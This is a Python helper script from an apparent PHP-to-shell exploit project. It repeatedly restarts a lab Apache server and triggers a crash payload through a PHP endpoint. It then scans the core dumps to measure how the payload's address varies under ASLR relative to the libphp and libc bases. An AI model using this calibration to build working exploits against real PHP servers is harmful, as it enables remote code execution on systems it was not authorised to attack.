#!/usr/bin/env python3
"""ASLR calibration: across N apache restarts (ASLR ON), measure
   dS = S - libphp_base (S = 320B payload block), and libc/libphp bases.
   Needs root (core dumps, apache restart). Run on the lab box.
   Usage: calibrate.py [N]
"""
import glob, os, re, subprocess, sys, time, urllib.request

BASE = "http://127.0.0.1:8090"
COREDIR = "/var/core"
TOOLS = "/home/debian/php2shell/tools"

def http(path, timeout=8):
    try:
        return urllib.request.urlopen(BASE + path, timeout=timeout).read()
    except Exception as e:
        return b""

def get_maps():
    m = http("/maps.php").decode()
    libphp = libc = None
    for line in m.splitlines():
        parts = line.split()
        if len(parts) >= 6:
            start = int(parts[0].split("-")[0], 16)
            if "libphp" in parts[-1] and libphp is None: libphp = start
            if "libc.so" in parts[-1] and libc is None: libc = start
    return libphp, libc

CONF = "/home/debian/php2shell/archive/legacy-8m/lab/apache2_aslr.conf"

def apache_restart():
    subprocess.run(["apache2", "-f", CONF, "-k", "stop"], capture_output=True)
    time.sleep(1.2)
    subprocess.run(["bash", "-c", f"ulimit -c unlimited; apache2 -f {CONF} -k start"], capture_output=True)
    for _ in range(40):
        if http("/maps.php", timeout=2):
            return True
        time.sleep(0.25)
    return False

def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 8
    results = []
    for i in range(n):
        for f in glob.glob(COREDIR + "/*"): os.unlink(f)
        for f in ("/tmp/payload.bin", "/tmp/x", "/tmp/destruct_done"):
            try: os.unlink(f)
            except FileNotFoundError: pass
        if not apache_restart():
            print(f"[{i}] apache failed to start"); continue
        libphp, libc = get_maps()
        payload = subprocess.run([sys.executable, TOOLS + "/mkpayload.py", "crash", f"C{i:02d}0"],
                                 capture_output=True).stdout
        open("/tmp/payload.bin", "wb").write(payload)
        os.chmod("/tmp/payload.bin", 0o644)
        http("/d2.php")
        time.sleep(0.6)
        cores = sorted(glob.glob(COREDIR + "/*"), key=os.path.getmtime)
        if not cores:
            print(f"[{i}] libphp=0x{libphp:x} libc=0x{libc:x} NOCORE (crash marker: {os.path.exists('/tmp/destruct_done')})")
            continue
        out = subprocess.run([sys.executable, TOOLS + "/core_scan.py", cores[-1]],
                             capture_output=True, text=True).stdout.strip()
        m = re.search(r"S=0x([0-9a-f]+).*libphp=0x([0-9a-f]+) libc=0x([0-9a-f]+)", out)
        if not m:
            print(f"[{i}] core scan failed: {out}"); continue
        S, clibphp, clibc = int(m.group(1),16), int(m.group(2),16), int(m.group(3),16)
        dS = S - clibphp
        dlc = clibc - clibphp
        agree = "OK" if (clibphp==libphp and clibc==libc) else f"DIFF http={libphp:x}/{libc:x}"
        results.append((dS, dlc))
        print(f"[{i}] libphp=0x{clibphp:x} libc=0x{clibc:x} S=0x{S:x} dS={dS:#x} d_libc={dlc:#x} {agree}")
    print("\n== histogram dS (S - libphp) ==")
    from collections import Counter
    for v, c in Counter(r[0] for r in results).most_common():
        print(f"  {v:#x}  x{c}")
    print("== histogram d_libc (libc - libphp) ==")
    for v, c in Counter(r[1] for r in results).most_common():
        print(f"  {v:#x}  x{c}")

if __name__ == "__main__":
    main()
